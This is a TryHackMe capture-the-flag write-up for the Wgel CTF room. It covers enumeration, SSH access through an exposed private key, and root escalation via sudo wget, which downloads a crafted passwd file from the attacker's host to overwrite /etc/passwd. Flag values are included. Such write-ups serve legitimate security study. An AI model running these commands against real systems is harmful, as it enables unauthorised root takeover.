🛡️ TryHackMe – Wgel CTF
Full Technical Walkthrough & Root Compromise Report

  

---

📌 Overview
Room Name: Wgel CTF

Platform: TryHackMe

Difficulty: Easy

Category: Linux / Enumeration / Privilege Escalation

This assessment simulates a common misconfiguration in Linux environments where a seemingly harmless binary is granted excessive sudo privileges. The attack chain involves:

• Advanced service enumeration

• Sensitive information disclosure in source code

• Exploiting arbitrary file write via `wget`

• Linux password database manipulation (`/etc/passwd`)

---

🔍 1. Enumeration Phase
🔎 Nmap Scan

Comprehensive port scanning to identify the attack surface:

```

nmap -sV -oN nmap.log <target_ip>

```

🌐 Web Directory Enumeration

Using `gobuster` to discover hidden directories:

```

gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt

```

Discovered Paths:

• `/sitemap` (Status: 301) -> Leading to `/sitemap/.ssh/`

---

🔓 2. Initial Access
Using the discovered RSA key and the username jessie (found in comments), I established an SSH connection.

```

chmod 600 id_rsa

ssh -i id_rsa jessie@<target_ip>

```

🎯 User Flag: `057c67131c3d5e42dd5cd3075b198ff6`

---

🚀 3. Privilege Escalation Discovery
Checked sudo permissions:

```

sudo -l

```

🔑 Critical Finding

```

(root) NOPASSWD: /usr/bin/wget

```

The user `jessie` can run `wget` as root without a password. This allows for Arbitrary File Write.

---

🛠️ 4. Exploitation (The /etc/passwd Attack)
Step 1: Password Hashing

On the Kali machine, I generated an MD5-crypt hash for the password `1234`:

```

openssl passwd -1 1234

# Result: $1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0

```

Step 2: Crafting Malicious passwd File

I created a local `passwd` file and appended a custom root user:

```

hacker:$1$oDwlj2tO$VL4knQ9qhR2F6K7bOrT2B0:0:0:root:/root:/bin/bash

```

Step 3: File Transfer & Overwrite

Used `wget` to overwrite the real `/etc/passwd`:

```

sudo /usr/bin/wget http://<kali_ip>/passwd -O /etc/passwd

```

---

🏁 5. Root Capture
Switched to the new user:

```

su hacker

# Password: 1234

id

# uid=0(root) gid=0(root) groups=0(root)

```

🎯 Root Flag: `b1b968b37519ad1daa6408188649263d`

---

🧠 Key Takeaways
1. The Danger of 'Safe' Binaries: Binaries like `wget` can be fatal if granted `sudo` rights.

2. Comment Hygiene: Developers must scrub internal usernames from production code.

3. SSH Key Management: Private keys should never be stored in web-accessible directories.

---

✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
